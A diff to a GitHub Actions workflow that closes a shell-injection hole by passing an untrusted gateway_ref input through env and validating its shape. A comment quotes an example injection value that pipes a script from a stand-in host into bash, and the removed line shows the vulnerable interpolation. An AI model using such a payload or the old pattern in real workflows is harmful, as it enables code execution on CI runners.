@@ -6,6 +6,18 @@ name: interop-smoke
 # which runs on pull_request and is therefore reachable from forks. Because
 # there is nothing here to exfiltrate, its safety does not depend on GitHub's
 # fork rules holding. Do not add secrets to this file.
+#
+# The other half of the threat model: `inputs.gateway_ref` is untrusted (it
+# is attacker-controlled on a `workflow_dispatch` from anyone with write
+# access, and indirectly shaped by whatever a `workflow_call` caller passes
+# through). NEVER interpolate `${{ inputs.* }}` directly into a `run:`
+# block — the expression is substituted into the script's *text* before bash
+# ever parses it, so a value like `x"; curl evil.sh | bash #` becomes
+# literal shell code on the runner (CWE-78). That would let a malicious
+# input make this job report `success` no matter what the assertions find,
+# which defeats the point of a required gate even though nothing here is
+# secret. Pass such inputs through `env:` (data, not code) and validate
+# their shape before use.
 on:
   workflow_call:
     inputs:
@@ -35,8 +47,22 @@ jobs:
 
       - name: Override GATEWAY_REF when one was supplied
         if: inputs.gateway_ref != ''
+        env:
+          GATEWAY_REF_INPUT: ${{ inputs.gateway_ref }}
         run: |
-          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${{ inputs.gateway_ref }}/" .github/upstream-compat.env
+          # GATEWAY_REF_INPUT arrives via env, not interpolation, so it is
+          # data to bash rather than code (see the SECURITY note above).
+          # Still validate its shape: the resolver only accepts 'latest' or
+          # vN.N.NN, and an unvalidated value could otherwise carry sed
+          # metacharacters that corrupt the knob file even without malice.
+          case "$GATEWAY_REF_INPUT" in
+            latest|v[0-9]*.[0-9]*.[0-9]*) ;;
+            *)
+              echo "error: gateway_ref must be 'latest' or vN.N.NN, got: $GATEWAY_REF_INPUT" >&2
+              exit 1
+              ;;
+          esac
+          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${GATEWAY_REF_INPUT}/" .github/upstream-compat.env
           cat .github/upstream-compat.env
 
       - name: Resolve upstream references
